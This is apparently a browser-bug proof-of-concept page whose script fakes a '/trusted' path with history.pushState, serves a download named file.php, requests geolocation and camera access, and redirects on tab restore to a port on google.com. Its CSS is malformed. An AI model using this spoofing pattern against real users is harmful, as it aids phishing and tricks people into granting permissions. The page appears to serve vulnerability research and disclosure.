<html>
<head>

<style>
body {

  font-family:-apple-system,BlinkMacSystemFont,system-ui;

}

button {
  margin:40px;

#panel {
  display:none;
  max-width:420px;
  margin:80px auto;

  box-shadow:0 20px 60px rgba(0,0,0,.2);
}

  margin-top:14px;

.download-button {
  margin-top:20px;

<body>

<div style="text-align:center">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Download File</h2>
  <div class="sub">Click below to download file.php</div>

  <button class="download-button" onclick="downloadFile()">
    Download File (file.php)
  </button>

  <hr>

  <button onclick="getLocation()">Get Location</button>
  <p id="locationOutput">Location: -</p>

  <button onclick="openCamera()">Open Camera</button>
  <video id="camera" autoplay playsinline></video>

  <div class="notice">
    Demo only — browser permission required
  </div>
</div>

<script>
const panel = document.getElementById('panel');
const trigger = document.getElementById('trigger');

// ======================
// DOWNLOAD FILE (PoC)
// ======================
function downloadFile() {
  const fileContent = `<?php echo 'This is a malicious PHP file!'; ?>`;
  const fileBlob = new Blob([fileContent], { type: 'text/plain' });
  const fileUrl = URL.createObjectURL(fileBlob);

  const downloadLink = document.createElement('a');
  downloadLink.href = fileUrl;
  downloadLink.download = 'file.php';
  document.body.appendChild(downloadLink);
  downloadLink.click();
  document.body.removeChild(downloadLink);
}

// ======================
// GEOLOCATION API
// ======================
function getLocation() {
  const output = document.getElementById('locationOutput');

  if (!navigator.geolocation) {
    output.textContent = 'Geolocation not supported';
    return;
  }

  navigator.geolocation.getCurrentPosition(
    pos => {
      output.textContent =
        `Location: ${pos.coords.latitude}, ${pos.coords.longitude}`;
    },
    () => {
      output.textContent = 'Location permission denied';
    }
  );
}

// ======================
// CAMERA API
// ======================
function openCamera() {
  const video = document.getElementById('camera');

  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => video.srcObject = stream)
    .catch(() => alert('Camera permission denied'));
}

// ======================
// ORIGIN DESYNC TRIGGER
// ======================
trigger.onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
};

// ======================
// TAB RESTORE DESYNC
// ======================
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'http://google.com:9090';
      }, 80);
    });
  });
});
</script>

</body>
</html>
